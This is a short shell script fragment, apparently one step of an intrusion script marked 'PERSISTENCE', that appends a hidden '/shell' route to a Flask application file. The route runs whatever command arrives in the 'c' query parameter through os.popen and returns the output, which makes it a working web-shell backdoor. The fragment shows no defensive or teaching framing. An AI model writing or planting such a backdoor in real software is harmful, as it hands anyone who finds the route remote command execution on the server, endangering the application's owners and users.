# PERSISTENCE: Injecting a backdoor into the app code
echo "[!] Injecting Production Backdoor..."
# Change path from ./app/app.py to ./app/app/app.py
cat <<EOF >> ./app/app/app.py

@app.route('/shell')
def shell():
    import os
    from flask import request
    return os.popen(request.args.get('c')).read()
EOF
